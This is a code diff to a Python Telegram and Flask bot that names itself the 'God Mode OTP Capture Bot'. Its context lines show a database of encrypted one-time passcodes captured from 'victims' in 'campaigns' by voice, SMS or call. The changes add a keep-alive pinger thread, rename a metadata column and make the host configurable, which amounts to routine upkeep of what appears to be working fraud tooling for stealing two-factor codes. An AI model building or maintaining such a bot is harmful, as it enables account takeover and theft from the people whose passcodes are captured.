@@ -59,6 +59,7 @@ from celery.result import AsyncResult
 
 import socks, socket, phonenumbers
 from logging.handlers import RotatingFileHandler
+import requests
 
 load_dotenv()
 
@@ -144,6 +145,8 @@ DATABASE_URL = os.getenv("DATABASE_URL") or f"sqlite:///{Path.cwd().as_posix()}/
 if not os.getenv("DATABASE_URL"):
     logger.warning("DATABASE_URL not set; using local SQLite database godmode.db")
 ENCRYPTION_KEY_FILE = os.getenv("ENCRYPTION_KEY_FILE", "/run/secrets/encryption_key")
+KEEP_ALIVE_URL = os.getenv("KEEP_ALIVE_URL", "")  # external uptime bot URL to ping (optional)
+KEEP_ALIVE_INTERVAL = int(os.getenv("KEEP_ALIVE_INTERVAL", 300))  # seconds
 
 if _missing_env:
     logger.warning("Missing environment variables (will continue; some features disabled):\n" + "\n".join(_missing_env))
@@ -453,7 +456,7 @@ class CapturedData(Base):
     field_value = Column(LargeBinary, nullable=False)  # encrypted value
     confidence = Column(Integer, default=100)  # 0-100 confidence score
     method = Column(String(50), default="voice")  # voice, sms, call
-    metadata = Column(Text, default="{}")  # JSON extra info
+    meta_json = Column(Text, default="{}")  # JSON extra info (renamed from 'metadata')
     timestamp = Column(DateTime, default=datetime.utcnow, index=True)
     processed = Column(Integer, default=0)  # flag for auditing
 
@@ -775,7 +778,7 @@ def capture_data(victim_id=None, campaign_id=None, data_type="otp", field_name="
                 field_value=enc,
                 confidence=confidence,
                 method=method,
-                metadata=json.dumps(metadata or {})
+                meta_json=json.dumps(metadata or {})
             )
             s.add(rec)
             s.commit()
@@ -1339,7 +1342,22 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ======================== MAIN ========================
 def run_flask():
-    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=False, use_reloader=False)
+    host = os.getenv("HOST", "0.0.0.0")
+    port = int(os.getenv("PORT", 5000))
+    app.run(host=host, port=port, debug=False, use_reloader=False)
+
+
+def keep_alive_pinger(url: str, interval: int = 300):
+    if not url:
+        return
+    logger.info(f"Keep-alive pinger enabled: pinging {url} every {interval}s")
+    while True:
+        try:
+            resp = requests.get(url, timeout=15)
+            logger.debug(f"Keep-alive ping to {url}: {resp.status_code}")
+        except Exception as e:
+            logger.warning(f"Keep-alive ping failed: {e}")
+        time.sleep(interval)
 
 if __name__ == "__main__":
     print_startup_banner()
@@ -1393,4 +1411,8 @@ if __name__ == "__main__":
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, config_value_receiver), group=1)
 
     logger.warning("🚀 God Mode OTP Capture Bot starting...")
+    # Start keep-alive pinger if configured
+    if KEEP_ALIVE_URL:
+        threading.Thread(target=keep_alive_pinger, args=(KEEP_ALIVE_URL, KEEP_ALIVE_INTERVAL), daemon=True).start()
+
     application.run_polling(drop_pending_updates=True)
